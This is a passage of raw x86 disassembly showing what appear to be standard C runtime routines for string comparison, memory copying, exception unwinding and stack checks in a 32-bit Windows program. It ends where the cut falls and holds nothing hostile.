  42806d:	mov    edi,DWORD PTR [ebp+0x8]
  428070:	mov    esi,edi
  428072:	xor    eax,eax
  428074:	repnz scas al,BYTE PTR es:[edi]
  428076:	neg    ecx
  428078:	add    ecx,ebx
  42807a:	mov    edi,esi
  42807c:	mov    esi,DWORD PTR [ebp+0xc]
  42807f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428081:	mov    al,BYTE PTR [esi-0x1]
  428084:	xor    ecx,ecx
  428086:	cmp    al,BYTE PTR [edi-0x1]
  428089:	ja     0x428090
  42808b:	je     0x428092
  42808d:	sub    ecx,0x2
  428090:	not    ecx
  428092:	mov    eax,ecx
  428094:	pop    ebx
  428095:	pop    esi
  428096:	pop    edi
  428097:	leave  
  428098:	ret    
  428099:	int3   
  42809a:	int3   
  42809b:	int3   
  42809c:	int3   
  42809d:	int3   
  42809e:	int3   
  42809f:	int3   
  4280a0:	push   ebp
  4280a1:	mov    ebp,esp
  4280a3:	push   esi
  4280a4:	xor    eax,eax
  4280a6:	push   eax
  4280a7:	push   eax
  4280a8:	push   eax
  4280a9:	push   eax
  4280aa:	push   eax
  4280ab:	push   eax
  4280ac:	push   eax
  4280ad:	push   eax
  4280ae:	mov    edx,DWORD PTR [ebp+0xc]
  4280b1:	lea    ecx,[ecx+0x0]
  4280b4:	mov    al,BYTE PTR [edx]
  4280b6:	or     al,al
  4280b8:	je     0x4280c3
  4280ba:	add    edx,0x1
  4280bd:	bts    DWORD PTR [esp],eax
  4280c1:	jmp    0x4280b4
  4280c3:	mov    esi,DWORD PTR [ebp+0x8]
  4280c6:	mov    edi,edi
  4280c8:	mov    al,BYTE PTR [esi]
  4280ca:	or     al,al
  4280cc:	je     0x4280da
  4280ce:	add    esi,0x1
  4280d1:	bt     DWORD PTR [esp],eax
  4280d5:	jae    0x4280c8
  4280d7:	lea    eax,[esi-0x1]
  4280da:	add    esp,0x20
  4280dd:	pop    esi
  4280de:	leave  
  4280df:	ret    
  4280e0:	push   ebp
  4280e1:	mov    ebp,esp
  4280e3:	push   ebx
  4280e4:	push   esi
  4280e5:	push   edi
  4280e6:	push   ebp
  4280e7:	push   0x0
  4280e9:	push   0x0
  4280eb:	push   0x4280f8
  4280f0:	push   DWORD PTR [ebp+0x8]
  4280f3:	call   0x428b6e
  4280f8:	pop    ebp
  4280f9:	pop    edi
  4280fa:	pop    esi
  4280fb:	pop    ebx
  4280fc:	mov    esp,ebp
  4280fe:	pop    ebp
  4280ff:	ret    
  428100:	mov    ecx,DWORD PTR [esp+0x4]
  428104:	test   DWORD PTR [ecx+0x4],0x6
  42810b:	mov    eax,0x1
  428110:	je     0x428121
  428112:	mov    eax,DWORD PTR [esp+0x8]
  428116:	mov    edx,DWORD PTR [esp+0x10]
  42811a:	mov    DWORD PTR [edx],eax
  42811c:	mov    eax,0x3
  428121:	ret    
  428122:	push   ebx
  428123:	push   esi
  428124:	push   edi
  428125:	mov    eax,DWORD PTR [esp+0x10]
  428129:	push   eax
  42812a:	push   0xfffffffe
  42812c:	push   0x428100
  428131:	push   DWORD PTR fs:0x0
  428138:	mov    DWORD PTR fs:0x0,esp
  42813f:	mov    eax,DWORD PTR [esp+0x20]
  428143:	mov    ebx,DWORD PTR [eax+0x8]
  428146:	mov    esi,DWORD PTR [eax+0xc]
  428149:	cmp    esi,0xffffffff
  42814c:	je     0x42817c
  42814e:	cmp    esi,DWORD PTR [esp+0x24]
  428152:	je     0x42817c
  428154:	lea    esi,[esi+esi*2]
  428157:	mov    ecx,DWORD PTR [ebx+esi*4]
  42815a:	mov    DWORD PTR [esp+0x8],ecx
  42815e:	mov    DWORD PTR [eax+0xc],ecx
  428161:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  428166:	jne    0x42817a
  428168:	push   0x101
  42816d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  428171:	call   0x4281b6
  428176:	call   DWORD PTR [ebx+esi*4+0x8]
  42817a:	jmp    0x42813f
  42817c:	pop    DWORD PTR fs:0x0
  428183:	add    esp,0xc
  428186:	pop    edi
  428187:	pop    esi
  428188:	pop    ebx
  428189:	ret    
  42818a:	xor    eax,eax
  42818c:	mov    ecx,DWORD PTR fs:0x0
  428193:	cmp    DWORD PTR [ecx+0x4],0x428100
  42819a:	jne    0x4281ac
  42819c:	mov    edx,DWORD PTR [ecx+0xc]
  42819f:	mov    edx,DWORD PTR [edx+0xc]
  4281a2:	cmp    DWORD PTR [ecx+0x8],edx
  4281a5:	jne    0x4281ac
  4281a7:	mov    eax,0x1
  4281ac:	ret    
  4281ad:	push   ebx
  4281ae:	push   ecx
  4281af:	mov    ebx,0x466f0c
  4281b4:	jmp    0x4281c0
  4281b6:	push   ebx
  4281b7:	push   ecx
  4281b8:	mov    ebx,0x466f0c
  4281bd:	mov    ecx,DWORD PTR [ebp+0x8]
  4281c0:	mov    DWORD PTR [ebx+0x8],ecx
  4281c3:	mov    DWORD PTR [ebx+0x4],eax
  4281c6:	mov    DWORD PTR [ebx+0xc],ebp
  4281c9:	pop    ecx
  4281ca:	pop    ebx
  4281cb:	ret    0x4
  4281ce:	int3   
  4281cf:	int3   
  4281d0:	push   ebp
  4281d1:	mov    ebp,esp
  4281d3:	push   edi
  4281d4:	push   esi
  4281d5:	mov    esi,DWORD PTR [ebp+0xc]
  4281d8:	mov    ecx,DWORD PTR [ebp+0x10]
  4281db:	mov    edi,DWORD PTR [ebp+0x8]
  4281de:	mov    eax,ecx
  4281e0:	mov    edx,ecx
  4281e2:	add    eax,esi
  4281e4:	cmp    edi,esi
  4281e6:	jbe    0x4281f0
  4281e8:	cmp    edi,eax
  4281ea:	jb     0x42836c
  4281f0:	test   edi,0x3
  4281f6:	jne    0x42820c
  4281f8:	shr    ecx,0x2
  4281fb:	and    edx,0x3
  4281fe:	cmp    ecx,0x8
  428201:	jb     0x42822c
  428203:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428205:	jmp    DWORD PTR [edx*4+0x42831c]
  42820c:	mov    eax,edi
  42820e:	mov    edx,0x3
  428213:	sub    ecx,0x4
  428216:	jb     0x428224
  428218:	and    eax,0x3
  42821b:	add    ecx,eax
  42821d:	jmp    DWORD PTR [eax*4+0x428230]
  428224:	jmp    DWORD PTR [ecx*4+0x42832c]
  42822b:	nop
  42822c:	jmp    DWORD PTR [ecx*4+0x4282b0]
  428233:	nop
  428234:	inc    eax
  428235:	add    BYTE PTR [edx+0x0],0x6c
  428239:	add    BYTE PTR [edx+0x0],0x90
  42823d:	add    BYTE PTR [edx+0x0],0x23
  428241:	ror    DWORD PTR [edx-0x75f877fa],1
  428247:	inc    esi
  428248:	add    DWORD PTR [eax+0x468a0147],ecx
  42824e:	add    al,cl
  428250:	jmp    0x28a0a57
  428255:	add    esi,0x3
  428258:	add    edi,0x3
  42825b:	cmp    ecx,0x8
  42825e:	jb     0x42822c
  428260:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428262:	jmp    DWORD PTR [edx*4+0x42831c]
  428269:	lea    ecx,[ecx+0x0]
  42826c:	and    edx,ecx
  42826e:	mov    al,BYTE PTR [esi]
  428270:	mov    BYTE PTR [edi],al
  428272:	mov    al,BYTE PTR [esi+0x1]
  428275:	shr    ecx,0x2
  428278:	mov    BYTE PTR [edi+0x1],al
  42827b:	add    esi,0x2
  42827e:	add    edi,0x2
  428281:	cmp    ecx,0x8
  428284:	jb     0x42822c
  428286:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428288:	jmp    DWORD PTR [edx*4+0x42831c]
  42828f:	nop
  428290:	and    edx,ecx
  428292:	mov    al,BYTE PTR [esi]
  428294:	mov    BYTE PTR [edi],al
  428296:	add    esi,0x1
  428299:	shr    ecx,0x2
  42829c:	add    edi,0x1
  42829f:	cmp    ecx,0x8
  4282a2:	jb     0x42822c
  4282a4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4282a6:	jmp    DWORD PTR [edx*4+0x42831c]
  4282ad:	lea    ecx,[ecx+0x0]
  4282b0:	adc    eax,DWORD PTR [ebx-0x7cffffbe]
  4282b6:	inc    edx
  4282b7:	add    al,bh
  4282b9:	add    BYTE PTR [edx+0x0],0xf0
  4282bd:	add    BYTE PTR [edx+0x0],0xe8
  4282c1:	add    BYTE PTR [edx+0x0],0xe0
  4282c5:	add    BYTE PTR [edx+0x0],0xd8
  4282c9:	add    BYTE PTR [edx+0x0],0xd0
  4282cd:	add    BYTE PTR [edx+0x0],0x8b
  4282d1:	inc    esp
  4282d2:	mov    fs,esp
  4282d4:	mov    DWORD PTR [edi+ecx*4-0x1c],eax
  4282d8:	mov    eax,DWORD PTR [esi+ecx*4-0x18]
  4282dc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4282e0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4282e4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4282e8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4282ec:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4282f0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4282f4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4282f8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4282fc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  428300:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  428304:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  428308:	lea    eax,[ecx*4+0x0]
  42830f:	add    esi,eax
  428311:	add    edi,eax
  428313:	jmp    DWORD PTR [edx*4+0x42831c]
  42831a:	mov    edi,edi
  42831c:	sub    al,0x83
  42831e:	inc    edx
  42831f:	add    BYTE PTR [ebx+eax*4],dh
  428322:	inc    edx
  428323:	add    BYTE PTR [eax-0x7d],al
  428326:	inc    edx
  428327:	add    BYTE PTR [ebx+eax*4+0x42],dl
  42832b:	add    BYTE PTR [ebx+0x5f5e0845],cl
  428331:	leave  
  428332:	ret    
  428333:	nop
  428334:	mov    al,BYTE PTR [esi]
  428336:	mov    BYTE PTR [edi],al
  428338:	mov    eax,DWORD PTR [ebp+0x8]
  42833b:	pop    esi
  42833c:	pop    edi
  42833d:	leave  
  42833e:	ret    
  42833f:	nop
  428340:	mov    al,BYTE PTR [esi]
  428342:	mov    BYTE PTR [edi],al
  428344:	mov    al,BYTE PTR [esi+0x1]
  428347:	mov    BYTE PTR [edi+0x1],al
  42834a:	mov    eax,DWORD PTR [ebp+0x8]
  42834d:	pop    esi
  42834e:	pop    edi
  42834f:	leave  
  428350:	ret    
  428351:	lea    ecx,[ecx+0x0]
  428354:	mov    al,BYTE PTR [esi]
  428356:	mov    BYTE PTR [edi],al
  428358:	mov    al,BYTE PTR [esi+0x1]
  42835b:	mov    BYTE PTR [edi+0x1],al
  42835e:	mov    al,BYTE PTR [esi+0x2]
  428361:	mov    BYTE PTR [edi+0x2],al
  428364:	mov    eax,DWORD PTR [ebp+0x8]
  428367:	pop    esi
  428368:	pop    edi
  428369:	leave  
  42836a:	ret    
  42836b:	nop
  42836c:	lea    esi,[ecx+esi*1-0x4]
  428370:	lea    edi,[ecx+edi*1-0x4]
  428374:	test   edi,0x3
  42837a:	jne    0x4283a0
  42837c:	shr    ecx,0x2
  42837f:	and    edx,0x3
  428382:	cmp    ecx,0x8
  428385:	jb     0x428394
  428387:	std    
  428388:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42838a:	cld    
  42838b:	jmp    DWORD PTR [edx*4+0x4284b8]
  428392:	mov    edi,edi
  428394:	neg    ecx
  428396:	jmp    DWORD PTR [ecx*4+0x428468]
  42839d:	lea    ecx,[ecx+0x0]
  4283a0:	mov    eax,edi
  4283a2:	mov    edx,0x3
  4283a7:	cmp    ecx,0x4
  4283aa:	jb     0x4283b8
  4283ac:	and    eax,0x3
  4283af:	sub    ecx,eax
  4283b1:	jmp    DWORD PTR [eax*4+0x4283bc]
  4283b8:	jmp    DWORD PTR [ecx*4+0x4284b8]
  4283bf:	nop
  4283c0:	int3   
  4283c1:	add    DWORD PTR [edx+0x0],0xfffffff0
  4283c5:	add    DWORD PTR [edx+0x0],0x18
  4283c9:	test   BYTE PTR [edx+0x0],al
  4283cc:	mov    al,BYTE PTR [esi+0x3]
  4283cf:	and    edx,ecx
  4283d1:	mov    BYTE PTR [edi+0x3],al
  4283d4:	sub    esi,0x1
  4283d7:	shr    ecx,0x2
  4283da:	sub    edi,0x1
  4283dd:	cmp    ecx,0x8
  4283e0:	jb     0x428394
  4283e2:	std    
  4283e3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4283e5:	cld    
  4283e6:	jmp    DWORD PTR [edx*4+0x4284b8]
  4283ed:	lea    ecx,[ecx+0x0]
  4283f0:	mov    al,BYTE PTR [esi+0x3]
  4283f3:	and    edx,ecx
  4283f5:	mov    BYTE PTR [edi+0x3],al
  4283f8:	mov    al,BYTE PTR [esi+0x2]
  4283fb:	shr    ecx,0x2
  4283fe:	mov    BYTE PTR [edi+0x2],al
  428401:	sub    esi,0x2
  428404:	sub    edi,0x2
  428407:	cmp    ecx,0x8
  42840a:	jb     0x428394
  42840c:	std    
  42840d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42840f:	cld    
  428410:	jmp    DWORD PTR [edx*4+0x4284b8]
  428417:	nop
  428418:	mov    al,BYTE PTR [esi+0x3]
  42841b:	and    edx,ecx
  42841d:	mov    BYTE PTR [edi+0x3],al
  428420:	mov    al,BYTE PTR [esi+0x2]
  428423:	mov    BYTE PTR [edi+0x2],al
  428426:	mov    al,BYTE PTR [esi+0x1]
  428429:	shr    ecx,0x2
  42842c:	mov    BYTE PTR [edi+0x1],al
  42842f:	sub    esi,0x3
  428432:	sub    edi,0x3
  428435:	cmp    ecx,0x8
  428438:	jb     0x428394
  42843e:	std    
  42843f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428441:	cld    
  428442:	jmp    DWORD PTR [edx*4+0x4284b8]
  428449:	lea    ecx,[ecx+0x0]
  42844c:	ins    BYTE PTR es:[edi],dx
  42844d:	test   BYTE PTR [edx+0x0],al
  428450:	je     0x4283d6
  428452:	inc    edx
  428453:	add    BYTE PTR [esp+eax*4+0x42],bh
  428457:	add    BYTE PTR [esp+eax*4-0x7b73ffbe],al
  42845e:	inc    edx
  42845f:	add    BYTE PTR [esp+eax*4-0x7b63ffbe],dl
  428466:	inc    edx
  428467:	add    BYTE PTR [edi-0x74ffbd7c],ch
  42846d:	inc    esp
  42846e:	mov    ds,WORD PTR [ecx+ecx*4]
  428471:	inc    esp
  428472:	(bad)  
  428473:	sbb    al,0x8b
  428475:	inc    esp
  428476:	mov    ds,WORD PTR [eax]
  428478:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42847c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  428480:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  428484:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  428488:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42848c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  428490:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  428494:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  428498:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42849c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  4284a0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  4284a4:	lea    eax,[ecx*4+0x0]
  4284ab:	add    esi,eax
  4284ad:	add    edi,eax
  4284af:	jmp    DWORD PTR [edx*4+0x4284b8]
  4284b6:	mov    edi,edi
  4284b8:	enter  0x4284,0x0
  4284bc:	rol    BYTE PTR [edx+eax*2+0x4284e000],1
  4284c3:	add    ah,dh
  4284c5:	test   BYTE PTR [edx+0x0],al
  4284c8:	mov    eax,DWORD PTR [ebp+0x8]
  4284cb:	pop    esi
  4284cc:	pop    edi
  4284cd:	leave  
  4284ce:	ret    
  4284cf:	nop
  4284d0:	mov    al,BYTE PTR [esi+0x3]
  4284d3:	mov    BYTE PTR [edi+0x3],al
  4284d6:	mov    eax,DWORD PTR [ebp+0x8]
  4284d9:	pop    esi
  4284da:	pop    edi
  4284db:	leave  
  4284dc:	ret    
  4284dd:	lea    ecx,[ecx+0x0]
  4284e0:	mov    al,BYTE PTR [esi+0x3]
  4284e3:	mov    BYTE PTR [edi+0x3],al
  4284e6:	mov    al,BYTE PTR [esi+0x2]
  4284e9:	mov    BYTE PTR [edi+0x2],al
  4284ec:	mov    eax,DWORD PTR [ebp+0x8]
  4284ef:	pop    esi
  4284f0:	pop    edi
  4284f1:	leave  
  4284f2:	ret    
  4284f3:	nop
  4284f4:	mov    al,BYTE PTR [esi+0x3]
  4284f7:	mov    BYTE PTR [edi+0x3],al
  4284fa:	mov    al,BYTE PTR [esi+0x2]
  4284fd:	mov    BYTE PTR [edi+0x2],al
  428500:	mov    al,BYTE PTR [esi+0x1]
  428503:	mov    BYTE PTR [edi+0x1],al
  428506:	mov    eax,DWORD PTR [ebp+0x8]
  428509:	pop    esi
  42850a:	pop    edi
  42850b:	leave  
  42850c:	ret    
  42850d:	push   ebp
  42850e:	mov    ebp,esp
  428510:	sub    esp,0xc
  428513:	mov    eax,ds:0x4669f0
  428518:	xor    eax,DWORD PTR [ebp+0x4]
  42851b:	and    BYTE PTR [ebp-0x6],0x0
  42851f:	push   0x6
  428521:	mov    DWORD PTR [ebp-0x4],eax
  428524:	lea    eax,[ebp-0xc]
  428527:	push   eax
  428528:	push   0x1004
  42852d:	push   DWORD PTR [ebp+0x8]
  428530:	call   DWORD PTR ds:0x429060
  428536:	test   eax,eax
  428538:	jne    0x42853f
  42853a:	or     eax,0xffffffff
  42853d:	jmp    0x428549
  42853f:	lea    eax,[ebp-0xc]
  428542:	push   eax
  428543:	call   0x42884e
  428548:	pop    ecx
  428549:	mov    ecx,DWORD PTR [ebp-0x4]
  42854c:	xor    ecx,DWORD PTR [ebp+0x4]
  42854f:	call   0x42595c
  428554:	leave  
  428555:	ret    
  428556:	push   0x38
  428558:	push   0x429f08
  42855d:	call   0x425290
  428562:	mov    eax,ds:0x4669f0
  428567:	xor    eax,DWORD PTR [ebp+0x4]
  42856a:	mov    DWORD PTR [ebp-0x1c],eax
  42856d:	xor    edi,edi
  42856f:	mov    DWORD PTR [ebp-0x20],edi
  428572:	mov    DWORD PTR [ebp-0x24],edi
  428575:	mov    eax,DWORD PTR [ebp+0x14]
  428578:	mov    ebx,DWORD PTR [eax]
  42857a:	mov    DWORD PTR [ebp-0x28],ebx
  42857d:	mov    DWORD PTR [ebp-0x2c],edi
  428580:	mov    eax,DWORD PTR [ebp+0x8]
  428583:	cmp    eax,DWORD PTR [ebp+0xc]
  428586:	je     0x4286ff
  42858c:	lea    ecx,[ebp-0x40]
  42858f:	push   ecx
  428590:	push   eax
  428591:	mov    esi,DWORD PTR ds:0x4290d8
  428597:	call   esi
  428599:	test   eax,eax
  42859b:	je     0x4285bd
  42859d:	cmp    DWORD PTR [ebp-0x40],0x1
  4285a1:	jne    0x4285bd
  4285a3:	lea    eax,[ebp-0x40]
  4285a6:	push   eax
  4285a7:	push   DWORD PTR [ebp+0xc]
  4285aa:	call   esi
  4285ac:	test   eax,eax
  4285ae:	je     0x4285bd
  4285b0:	cmp    DWORD PTR [ebp-0x40],0x1
  4285b4:	jne    0x4285bd
  4285b6:	mov    DWORD PTR [ebp-0x2c],0x1
  4285bd:	cmp    DWORD PTR [ebp-0x2c],edi
  4285c0:	je     0x4285dc
  4285c2:	cmp    ebx,0xffffffff
  4285c5:	je     0x4285cb
  4285c7:	mov    esi,ebx
  4285c9:	jmp    0x4285d7
  4285cb:	push   DWORD PTR [ebp+0x10]
  4285ce:	call   0x4258a0
  4285d3:	pop    ecx
  4285d4:	mov    esi,eax
  4285d6:	inc    esi
  4285d7:	mov    DWORD PTR [ebp-0x44],esi
  4285da:	jmp    0x4285df
  4285dc:	mov    esi,DWORD PTR [ebp-0x44]
  4285df:	cmp    DWORD PTR [ebp-0x2c],edi
  4285e2:	jne    0x4285fe
  4285e4:	push   edi
  4285e5:	push   edi
  4285e6:	push   ebx
  4285e7:	push   DWORD PTR [ebp+0x10]
  4285ea:	push   0x1
  4285ec:	push   DWORD PTR [ebp+0x8]
  4285ef:	call   DWORD PTR ds:0x429104
  4285f5:	mov    esi,eax
  4285f7:	mov    DWORD PTR [ebp-0x44],esi
  4285fa:	cmp    esi,edi
  4285fc:	je     0x428656
  4285fe:	mov    DWORD PTR [ebp-0x4],edi
  428601:	lea    eax,[esi+esi*1]
  428604:	add    eax,0x3
  428607:	and    eax,0xfffffffc
  42860a:	call   0x4252e0
  42860f:	mov    DWORD PTR [ebp-0x18],esp
  428612:	mov    ebx,esp
  428614:	mov    DWORD PTR [ebp-0x48],ebx
  428617:	lea    eax,[esi+esi*1]
  42861a:	push   eax
  42861b:	push   edi
  42861c:	push   ebx
  42861d:	call   0x427b90
  428622:	add    esp,0xc
  428625:	or     DWORD PTR [ebp-0x4],0xffffffff
  428629:	jmp    0x428642
  42862b:	xor    eax,eax
  42862d:	inc    eax
  42862e:	ret    
  42862f:	mov    esp,DWORD PTR [ebp-0x18]
  428632:	call   0x428725
  428637:	xor    edi,edi
  428639:	xor    ebx,ebx
  42863b:	or     DWORD PTR [ebp-0x4],0xffffffff
  42863f:	mov    esi,DWORD PTR [ebp-0x44]
  428642:	cmp    ebx,edi
  428644:	jne    0x428664
  428646:	push   esi
  428647:	push   0x2
  428649:	call   0x4263a8
  42864e:	pop    ecx
  42864f:	pop    ecx
  428650:	mov    ebx,eax
  428652:	cmp    ebx,edi
  428654:	jne    0x42865d
  428656:	xor    eax,eax
  428658:	jmp    0x428711
  42865d:	mov    DWORD PTR [ebp-0x24],0x1
  428664:	push   esi
  428665:	push   ebx
  428666:	push   DWORD PTR [ebp-0x28]
  428669:	push   DWORD PTR [ebp+0x10]
  42866c:	push   0x1
  42866e:	push   DWORD PTR [ebp+0x8]
  428671:	call   DWORD PTR ds:0x429104
  428677:	test   eax,eax
  428679:	je     0x428702
  42867f:	cmp    DWORD PTR [ebp+0x18],edi
  428682:	je     0x4286a4
  428684:	push   edi
  428685:	push   edi
  428686:	push   DWORD PTR [ebp+0x1c]
  428689:	push   DWORD PTR [ebp+0x18]
  42868c:	push   esi
  42868d:	push   ebx
  42868e:	push   edi
  42868f:	push   DWORD PTR [ebp+0xc]
  428692:	call   DWORD PTR ds:0x429098
  428698:	test   eax,eax
  42869a:	je     0x428702
  42869c:	mov    eax,DWORD PTR [ebp+0x18]
  42869f:	mov    DWORD PTR [ebp-0x20],eax
  4286a2:	jmp    0x428702
  4286a4:	cmp    DWORD PTR [ebp-0x2c],edi
  4286a7:	jne    0x4286bf
  4286a9:	push   edi
  4286aa:	push   edi
  4286ab:	push   edi
  4286ac:	push   edi
  4286ad:	push   esi
  4286ae:	push   ebx
  4286af:	push   edi
  4286b0:	push   DWORD PTR [ebp+0xc]
  4286b3:	call   DWORD PTR ds:0x429098
  4286b9:	mov    esi,eax
  4286bb:	cmp    esi,edi
  4286bd:	je     0x428702
  4286bf:	push   esi
  4286c0:	push   0x1
  4286c2:	call   0x4263a8
  4286c7:	pop    ecx
  4286c8:	pop    ecx
  4286c9:	mov    DWORD PTR [ebp-0x20],eax
  4286cc:	cmp    eax,edi
  4286ce:	je     0x428702
  4286d0:	push   edi
  4286d1:	push   edi
  4286d2:	push   esi
  4286d3:	push   eax
  4286d4:	push   esi
  4286d5:	push   ebx
  4286d6:	push   edi
  4286d7:	push   DWORD PTR [ebp+0xc]
  4286da:	call   DWORD PTR ds:0x429098
  4286e0:	cmp    eax,edi
  4286e2:	jne    0x4286f2
  4286e4:	push   DWORD PTR [ebp-0x20]
  4286e7:	call   0x425e9a
  4286ec:	pop    ecx
  4286ed:	mov    DWORD PTR [ebp-0x20],edi
  4286f0:	jmp    0x428702
  4286f2:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  4286f6:	je     0x428702
  4286f8:	mov    ecx,DWORD PTR [ebp+0x14]
  4286fb:	mov    DWORD PTR [ecx],eax
  4286fd:	jmp    0x428702
  4286ff:	mov    ebx,DWORD PTR [ebp-0x48]
  428702:	cmp    DWORD PTR [ebp-0x24],edi
  428705:	je     0x42870e
  428707:	push   ebx
  428708:	call   0x425e9a
  42870d:	pop    ecx
  42870e:	mov    eax,DWORD PTR [ebp-0x20]
  428711:	lea    esp,[ebp-0x54]
  428714:	mov    ecx,DWORD PTR [ebp-0x1c]
  428717:	xor    ecx,DWORD PTR [ebp+0x4]
  42871a:	call   0x42595c
  42871f:	call   0x4252cb
  428724:	ret    
  428725:	push   ebp
  428726:	mov    ebp,esp
  428728:	sub    esp,0x48
  42872b:	push   ebx
  42872c:	push   esi
  42872d:	push   edi
  42872e:	push   0x4
  428730:	pop    eax
  428731:	call   0x4252e0
  428736:	mov    ebx,esp
  428738:	push   0x1c
  42873a:	lea    eax,[ebp-0x24]
  42873d:	push   eax
  42873e:	push   ebx
  42873f:	call   DWORD PTR ds:0x42903c
  428745:	test   eax,eax
  428747:	je     0x4287ba
  428749:	mov    edi,DWORD PTR [ebp-0x20]
  42874c:	lea    eax,[ebp-0x48]
  42874f:	push   eax
  428750:	call   DWORD PTR ds:0x429040
  428756:	mov    eax,DWORD PTR [ebp-0x44]
  428759:	lea    esi,[eax-0x1]
  42875c:	not    esi
  42875e:	and    esi,ebx
  428760:	sub    esi,eax
  428762:	mov    DWORD PTR [ebp-0x4],eax
  428765:	mov    eax,ds:0x467084
  42876a:	mov    ecx,eax
  42876c:	dec    ecx
  42876d:	neg    ecx
  42876f:	sbb    ecx,ecx
  428771:	and    ecx,0xffff1000
  428777:	add    ecx,0x11000
  42877d:	add    ecx,edi
  42877f:	cmp    esi,ecx
  428781:	jb     0x4287ba
  428783:	cmp    eax,0x1
  428786:	je     0x4287d2
  428788:	mov    ebx,edi
  42878a:	mov    edi,0x1000
  42878f:	push   0x1c
  428791:	lea    eax,[ebp-0x24]
  428794:	push   eax
  428795:	push   ebx
  428796:	call   DWORD PTR ds:0x42903c
  42879c:	test   eax,eax
  42879e:	je     0x4287ba
  4287a0:	add    ebx,DWORD PTR [ebp-0x18]
  4287a3:	test   DWORD PTR [ebp-0x14],edi
  4287a6:	je     0x42878f
  4287a8:	test   BYTE PTR [ebp-0xf],0x1
  4287ac:	mov    ebx,DWORD PTR [ebp-0x24]
  4287af:	je     0x4287b6
  4287b1:	xor    eax,eax
  4287b3:	inc    eax
  4287b4:	jmp    0x4287ee
  4287b6:	cmp    esi,ebx
  4287b8:	jae    0x4287be
  4287ba:	xor    eax,eax
  4287bc:	jmp    0x4287ee
  4287be:	push   0x4
  4287c0:	push   edi
  4287c1:	push   DWORD PTR [ebp-0x4]
  4287c4:	push   ebx
  4287c5:	call   DWORD PTR ds:0x4290e4
  4287cb:	mov    eax,ds:0x467084
  4287d0:	jmp    0x4287d4
  4287d2:	mov    ebx,esi
  4287d4:	dec    eax
  4287d5:	neg    eax
  4287d7:	sbb    eax,eax
  4287d9:	and    eax,0x103
  4287de:	lea    ecx,[ebp-0x8]
  4287e1:	push   ecx
  4287e2:	inc    eax
  4287e3:	push   eax
  4287e4:	push   DWORD PTR [ebp-0x4]
  4287e7:	push   ebx
  4287e8:	call   DWORD PTR ds:0x429024
  4287ee:	lea    esp,[ebp-0x54]
  4287f1:	pop    edi
  4287f2:	pop    esi
  4287f3:	pop    ebx
  4287f4:	leave  
  4287f5:	ret    
  4287f6:	int3   
  4287f7:	int3   
  4287f8:	int3   
  4287f9:	int3   
  4287fa:	int3   
  4287fb:	int3   
  4287fc:	int3   
  4287fd:	int3   
  4287fe:	int3   
  4287ff:	int3   
  428800:	push   ebp
  428801:	mov    ebp,esp
  428803:	push   edi
  428804:	push   esi
  428805:	push   ebx
  428806:	mov    esi,DWORD PTR [ebp+0xc]
  428809:	mov    edi,DWORD PTR [ebp+0x8]
  42880c:	mov    al,0xff
  42880e:	mov    edi,edi
  428810:	or     al,al
  428812:	je     0x428846
  428814:	mov    al,BYTE PTR [esi]
  428816:	add    esi,0x1
  428819:	mov    ah,BYTE PTR [edi]
  42881b:	add    edi,0x1
  42881e:	cmp    ah,al
  428820:	je     0x428810
  428822:	sub    al,0x41
  428824:	cmp    al,0x1a
  428826:	sbb    cl,cl
  428828:	and    cl,0x20
  42882b:	add    al,cl
  42882d:	add    al,0x41
  42882f:	xchg   al,ah
  428831:	sub    al,0x41
  428833:	cmp    al,0x1a
  428835:	sbb    cl,cl
  428837:	and    cl,0x20
  42883a:	add    al,cl
  42883c:	add    al,0x41
  42883e:	cmp    al,ah
  428840:	je     0x428810
  428842:	sbb    al,al
  428844:	sbb    al,0xff
  428846:	movsx  eax,al
  428849:	pop    ebx
  42884a:	pop    esi
  42884b:	pop    edi
  42884c:	leave  
  42884d:	ret    
  42884e:	push   esi
  42884f:	push   edi
  428850:	call   0x425145
  428855:	mov    edi,DWORD PTR [eax+0x64]
  428858:	cmp    edi,DWORD PTR ds:0x466b4c
  42885e:	je     0x428867
  428860:	call   0x4265ef
  428865:	mov    edi,eax
  428867:	mov    esi,DWORD PTR [esp+0xc]
  42886b:	cmp    DWORD PTR [edi+0x28],0x1
  42886f:	movzx  eax,BYTE PTR [esi]
  428872:	jle    0x428882
  428874:	push   0x8
  428876:	push   eax
  428877:	push   edi
  428878:	call   0x4288d6
  42887d:	add    esp,0xc
  428880:	jmp    0x42888c
  428882:	mov    ecx,DWORD PTR [edi+0x48]
  428885:	movzx  eax,BYTE PTR [ecx+eax*2]
  428889:	and    eax,0x8
  42888c:	test   eax,eax
  42888e:	je     0x428893
  428890:	inc    esi
